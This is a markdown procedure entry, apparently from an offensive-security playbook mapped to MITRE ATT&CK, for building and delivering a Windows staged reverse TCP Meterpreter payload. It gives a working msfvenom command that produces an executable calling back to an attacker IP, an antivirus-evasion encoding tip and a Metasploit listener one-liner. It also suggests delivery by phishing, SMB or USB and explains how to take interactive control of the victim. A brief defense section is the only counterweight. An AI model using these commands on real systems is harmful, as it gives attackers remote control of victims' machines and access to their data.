---
id: 0df64f5b-5bc3-45e3-b341-2d997c0ba2ab
name: Generate-Windows-Staged-Reverse-TCP-Meterpreter-Payload
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:24.816975+00:00'
updated_at: '2023-04-10T20:25:22.096034+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
techniques:
  - >-
    [[techniques/Obfuscated Files or Information|T1027 - Obfuscated Files or
    Information]]
  - >-
    [[techniques/Standard Application Layer Protocol|T1071 - Standard
    Application Layer Protocol]]
sub_techniques:
  - '[[sub-techniques/Web Protocols|T1071.001 - Web Protocols]]'
tags:
  - '[[tags/Meterpreter-Shell]]'
  - '[[tags/Reverse-Shell-Cheat-Sheet]]'
  - '[[tags/Windows-Staged-Reverse-TCP]]'
commands:
  - '[[commands/msfvenom-generate-windows-meterpreter-reverse-tcp]]'
  - '[[commands/msfconsole-setup-multi-handler]]'
platforms:
  - Windows
tools:
  - '[[tools/Metasploit-Framework]]'
validated: true
---

# Generate-Windows-Staged-Reverse-TCP-Meterpreter-Payload

## Summary

This procedure generates a staged reverse TCP Meterpreter payload for Windows using msfvenom, sets up a Metasploit listener to receive the connection, and establishes a full Meterpreter shell session on the target. The staged approach uses a small initial stager to download the larger Meterpreter payload, making it suitable for evading network restrictions like firewalls or NAT.

## Description

A staged reverse TCP Meterpreter shell operates in two phases: the first stage deploys a compact stager that connects back to the attacker's listener over TCP, then downloads and executes the full Meterpreter shell as the second stage. This method is effective for targets behind firewalls, as the initial payload is small (under 1KB) and uses standard TCP for outbound connections. Once established, the Meterpreter provides advanced post-exploitation capabilities like file upload/download, keylogging, and privilege escalation. This procedure assumes the attacker has a way to deliver the generated executable to the target, such as via phishing or drive-by download. The target environment is Windows (XP to 11), with outbound TCP access to the attacker's IP and port.

## Requirements

1. Kali Linux or a system with Metasploit Framework installed.
2. Knowledge of the target's IP address, firewall rules, and outbound connectivity.
3. Attacker machine with a public or reachable IP address for the listener (use ngrok or VPS if behind NAT).
4. Basic familiarity with Metasploit console commands.

## Defense

- Implement application whitelisting and endpoint detection/response (EDR) tools to block unsigned executables.
- Monitor outbound network connections for unusual TCP traffic to unknown IPs/ports.
- Enable Windows Defender or similar AV with behavioral analysis to detect payload execution and process injection.
- Use network segmentation and proxy inspection to limit outbound connections from internal hosts.

## Objectives

1. Generate a small, staged Meterpreter payload executable for Windows.
2. Configure a Metasploit multi-handler to listen for incoming connections.
3. Establish a reverse TCP session upon payload execution on the target.
4. Gain interactive Meterpreter access for post-exploitation.

## Instructions

### Step 1: Generate the Staged Payload

**Context**: Use msfvenom to create the Windows executable payload with reverse TCP staging. This produces a small stager that will connect to your listener and fetch the full Meterpreter.

**Command** ([[commands/msfvenom-generate-windows-meterpreter-reverse-tcp]]):
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$_ATTACKER_IP LPORT=$_LISTEN_PORT -f exe > staged_payload.exe
```

> This command binds the payload to connect back to the specified LHOST and LPORT. The output is a standalone .exe file ready for delivery. Verify the file size is small (~38KB for staged). If encoding is needed for AV evasion, add -e x86/shikata_ga_nai.

### Step 2: Set Up the Metasploit Listener

**Context**: Launch Metasploit and configure a multi-handler to catch the incoming stager connection and serve the second-stage Meterpreter payload.

**Command** ([[commands/msfconsole-setup-multi-handler]]):
```bash
msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $_ATTACKER_IP; set LPORT $_LISTEN_PORT; exploit -j"
```

> This starts a backgrounded handler job. The -q flag quiets the console, and -x runs the commands directly. Monitor with 'jobs' to confirm it's running. The handler will automatically stage the full Meterpreter upon stager connection.

### Step 3: Deliver and Execute the Payload on Target

**Context**: Transfer the generated .exe to the target (e.g., via SMB share, email attachment, or USB) and execute it. This could involve social engineering or exploiting an initial access vector.

**Instructions**: Use tools like [[tools/Metasploit-Framework]] for delivery modules if available (e.g., windows/smb/smb_delivery). On the target, run the .exe via command prompt or double-click. No additional commands here, as execution is context-dependent.

> Expected: The stager connects outbound to your listener, downloads the Meterpreter, and injects it into a process.

### Step 4: Interact with the Meterpreter Session

**Context**: Once connected, interact with the new session for commands like sysinfo, getuid, or shell.

**Instructions**: In msfconsole, list sessions with 'sessions -l', then interact with 'sessions -i <ID>'. Run 'sysinfo' to confirm access.

> Success: Meterpreter prompt appears, allowing full control. If no connection, check firewall, IP reachability, or regenerate with different port.
